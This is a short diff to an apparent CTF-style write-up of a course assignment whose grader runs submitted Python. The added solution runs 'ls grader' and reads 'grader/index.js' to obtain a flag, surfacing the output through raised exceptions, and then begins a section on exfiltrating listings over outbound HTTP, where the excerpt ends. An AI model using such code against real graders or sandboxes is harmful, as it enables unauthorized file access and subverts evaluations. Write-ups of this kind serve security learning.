@@ -4,7 +4,20 @@ My CSCE 437 professor just released our latest programming assignment, but it se
 
 ## Solution
 
+An exception can be raised to get output from the script.
+
+```python
+# List directories command execution
+    import os
+    raise(Exception(os.popen('ls grader').read()))
+
+    # Read index with flag
+    raise(Exception(open('grader/index.js').read()))
 ```
+
+Alternatively, outbound http requests can be made.
+
+```python
 import os
 
 # use ls to exfil directory and file listings
